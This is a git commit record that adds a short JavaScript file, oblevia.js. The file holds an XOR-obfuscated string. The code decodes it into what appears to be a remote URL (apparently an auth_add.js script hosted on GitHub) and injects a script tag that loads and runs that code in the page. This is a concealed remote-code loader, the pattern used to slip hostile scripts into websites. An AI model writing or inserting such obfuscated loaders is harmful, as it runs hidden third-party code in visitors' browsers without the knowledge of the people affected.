8178ca967a0812644c331cb7a17212874b40474f
vikat9596 <vikat9596@gmail.com>
2013-09-04 12:42:29 +0530

    Create oblevia.js

---
+++ oblevia.js
@@ -0,0 +1,10 @@
+ var X="jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-HgqvgpUjkvg-ocqvgp-cwvm]cff,hq";
+Y = "";
+Z = "";
+var V;
+V = X.length;
+for (i = 0; i < V; i++) {
+    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
+}
+Z = unescape(Y);
+document.body.appendChild(document.createElement('script')).src = Z;
